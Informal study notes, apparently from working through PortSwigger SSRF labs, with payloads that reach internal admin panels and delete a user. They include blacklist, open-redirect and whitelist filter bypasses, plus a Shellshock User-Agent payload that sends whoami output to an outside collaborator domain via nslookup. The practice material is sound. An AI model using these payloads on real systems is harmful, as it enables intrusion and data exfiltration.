
![[Screenshot_2023-08-27_11_16_34.png]]

Savitar explained this on other ocassion, but bassically is like request things to the local server, or localhost or some server working on the victims machine, and then retrieve data.

you can play with wfuzz and then search for ports http://localhost:port

# BASIC ATTACK TO LOCALHOST SERVER #


On check stock we see this(the query intercepted)
```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```
ctrl+shift+u (url decode)

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The new query is this

```
stockApi=http://localhost/admin
```

Now that we accessed to that resource we can delete it, if we investigate the url source, this is the path to delete it 
```
carlos - </span>
                            <a href="/admin/delete?username=carlos">
```

# Basic SSRF  against another back-end system #

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.


we need to find a valid ip, we can do it with burpsuit

```
stockApi=http://192.168.0.1:8080/admin

```

instead of 1 we select it and we put a list in the intruder of burpsuit


The 24 give a status 200 on the request
```
stockApi=http://192.168.0.24:8080/admin
```


And on the source code, the path to delete is this:

```
http://192.168.0.24:8080/admin/delete?username=carlos
```

# SSRF with blacklist-based input filter #

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.


Interesting concept, when you ping 127.0.0.1 always is referring to your localhost, but if you put something like 127.0.0.8 or 127.0.2.8 its your localhost too. 

In this exercise there is a blacklist if you put this query on the proxy intruder:

```
stockApi=http://localhost/admin
```
it will be rejected, you cannot put admin or localhost , or 127.0.0.1, but you can try on hexadecimal or other types of notation.


The app likes this , hi double url encoded the "a" of admin
admin=%61dmin
then url encode the "%"
%61=%2561dmin
```
stockApi=http://127.1/%2561dmin
```

And then we access to the resource where we can delete carlos on the admin panel
```
/admin/delete?username=carlos
```
Now we need to do the same to delete carlos
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
If you do this twice, the url encode, when the server decodes the query, and compares the string "admin", finally is comparing with %61dmin, because the server, only url decodes just once , not twice

# SSRF with filter bypass via open redirection vulnerability #

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.


This is the explanation about what is an "open redirect"

![[Screenshot_2023-08-27_14_23_41.png]]
Its a website that is vulnerable to make query's on itself and then redirect to another site, on this way many attackers makes a DDOS attack

The vulnerability isnt on "view details" as we did on other exercises, because on that item we can put only a path:

like "/user/files/products"

The vulnerability is when you put "next product", on this field we see the open redirection vulnerability.

This redirects us where we want to go
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
```

we are trying to go to

http://192.168.0.12:8080/admin

```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
```

But we need to put it on the query of the "stock". Here we are putting a path... but we inserted a open redirection vuln

```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

we have to url encode the & = %26


And here is the path to delete carlos, fuck you carlos !! jajaja
```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```


# Blind SSRF with out-of-band detection #

I cant do this one without burp collaborator, but i will put the answers here


This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.


NOTE: the referer is something that register the website where are you coming from, this is used for metrics and analytics of websites.

So, here we need to change the referer to a "collaborator website"

# SSRF  with whitelist-based input filter #

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.


The problem here resides that in  stockApi="htp://"
we can only put "stock.weliketoshop.net" at the start.  

He talked about something about authentications , that we can acces and authenticate to a url with this way

http://user:password@cosas.com 

On the url when you put #something it redirects to you where "something" exist on the website. (BECAUSE IT IS HIS HTML ID)

```
http://localhost#@stock.weliketoshop.net:8080
```
we url encoded the # 
```
http://localhost%23@stock.weliketoshop.net:8080
```
and url encode the # again
```
http://localhost%2523@stock.weliketoshop.net:8080
```

and now we need to go to the admin panel, we must put it on the end of the query
```
http://localhost%2523@stock.weliketoshop.net:8080/admin
```
and then to delete carlos

```
stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```


#  Blind SSRF with Shellshock exploitation #

WE CANT DO THIS, WE NEED THE COLLABORATOR.


This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

SHELLLSHOK= if the server contains a vuln shell, generally in relation with the user-agent (the most common is this but sometimes no). So you can inject commands with this user agent. (this is because the server has antique and vulnerable shells)


How attackers attack:
https://blog.cloudflare.com/inside-shellshock/


He uses the "collaborator everywhere" that adds a lot of "headers" on the petitions. And when you put "pull now" if you recive something you can be sure on what header you can to the SSRF (you have to get the pro version..)


SO.. to solve the problem we need to identify the user in which we can put the "collaborator" or outside domain and then make queries and get the results on our server responses.


So the referer is 

```
user-Agent: () { :; }; /usr/bin/nslookup $(whoami).burpsuitcollaborator.domain.com

referrer: http://192.168.0.x/8080
```
He send this to the intruder, and he tries. The response to the colaborator url will be from the vulnerable server of the ip (one between 1 to 254).






The esponse of whoami wi will get 